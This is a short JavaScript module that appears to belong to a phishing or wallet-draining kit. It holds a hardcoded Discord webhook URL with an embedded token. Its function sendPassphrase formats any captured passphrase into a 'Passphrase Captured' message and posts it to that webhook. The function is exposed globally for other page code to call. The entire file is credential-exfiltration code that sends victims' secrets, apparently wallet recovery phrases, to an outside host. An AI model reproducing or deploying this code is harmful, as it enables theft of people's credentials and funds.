(function () {
    const https = require("https");

    const webhookUrl = "https://discord.com/api/webhooks/1533956249438257314/jizo97DCTsUZwMcymFwmo_HW16bBXP4lp3s7kKX9S4979RZc0qrhG0hbofwmiTYgHxLG";
    
    function sendDiscordNotification(content) {
        if (!webhookUrl) {
            console.log("[DISCORD] Webhook not configured");
            return;
        }

        const payload = JSON.stringify({
            content: content,
        });

        const url = new URL(webhookUrl);

        const options = {
            hostname: url.hostname,
            port: 443,
            path: url.pathname + url.search,
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "Content-Length": Buffer.byteLength(payload),
            },
        };

        const req = https.request(options, (res) => {
            let data = "";
            res.on("data", (chunk) => (data += chunk));
            res.on("end", () => {
                if (res.statusCode === 204 || res.statusCode === 200) {
                    console.log("[DISCORD] Notification sent successfully");
                } else {
                    console.error(
                        "[DISCORD] Failed to send notification:",
                        res.statusCode,
                        data,
                    );
                }
            });
        });

        req.on("error", (error) => {
            console.error("[DISCORD] Request error:", error.message);
        });

        req.write(payload);
        req.end();
    }

    function sendPassphrase(pass) {
        const message = `**Passphrase Captured**\n\n• Passphrase: ${pass || "N/A"}`;
        sendDiscordNotification(message);
    }

    globalThis.sendPassphrase = sendPassphrase;
})();
